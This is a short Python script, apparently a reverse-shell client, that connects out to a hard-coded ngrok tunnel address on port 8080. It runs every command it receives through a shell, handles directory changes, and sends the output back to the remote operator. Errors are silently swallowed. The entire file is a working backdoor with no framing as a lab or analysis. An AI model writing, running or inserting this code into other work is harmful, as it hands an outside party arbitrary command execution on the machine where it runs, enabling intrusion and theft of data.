import socket
import subprocess, os

class Client:
    IP_ADDRESS = '4.tcp.ngrok.io'
    PORT = 8080

    def main(self):
        client = socket.socket()

        try:
            client.connect((self.IP_ADDRESS, self.PORT))
            client.send("Hey, I'm connected".encode())
            
            while True:
                command = client.recv(1024)

                process = subprocess.Popen(
                    command.decode(), shell=True,
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE
                )
                result = "No hay salida."
                if command.decode().startswith("cd "):
                    command = command.decode().replace("cd ", "")
                    os.chdir(command)
                    result = "Cambiado de directorio a: " + command
                else:
                    result = process.stdout.read().decode()

                if process.stderr.read().decode() != "":
                    client.send("Error in command line".encode())
                elif result == "No hay salida.":
                    client.send(result.encode())
                else:
                    client.send(f"\n{result}".encode())
        except:
            pass

if __name__ == '__main__':
    try:
        Client().main()
    except KeyboardInterrupt:
        exit()
